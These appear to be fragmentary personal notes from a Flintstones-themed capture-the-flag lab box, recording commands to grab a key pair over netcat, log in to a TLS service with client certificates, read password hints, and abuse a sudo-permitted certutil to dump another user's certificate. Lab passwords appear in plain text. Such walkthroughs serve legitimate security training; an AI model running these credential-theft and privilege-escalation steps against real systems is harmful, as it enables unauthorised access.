 nc 10.114.182.103 9009
 public key
 private key

sudo openssl s_client -connect 10.114.182.103:54321 -cert b3drock_public -key b3drock_private

This service is for login and password hints
b3dr0ck> hint
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')

```
sudo -l
```
```
sudo /usr/bin/certutil cat fred.certificate.pem
```


 hints
Password hint: YabbaDabbaD0000! (user = 'fredcertificatepem')


sudo openssl s_client -connect 10.114.182.103:54321 -cert fred_b3drock_public -key fred_b3drock_private

